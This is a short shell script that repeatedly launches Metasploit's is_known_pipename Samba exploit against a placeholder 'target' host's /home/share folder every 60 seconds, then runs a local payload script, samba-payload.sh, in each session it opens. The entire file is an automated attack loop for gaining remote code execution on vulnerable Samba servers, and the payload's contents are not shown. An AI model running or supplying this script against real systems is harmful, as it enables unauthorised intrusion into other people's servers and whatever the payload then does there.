#/bin/sh
while true; do
    ./msfconsole -q -x "use exploit/linux/samba/is_known_pipename;set RHOSTS target;set SMB_FOLDER /home/share;exploit -z;sessions -s ./samba-payload.sh;exit -y"
    sleep 60
done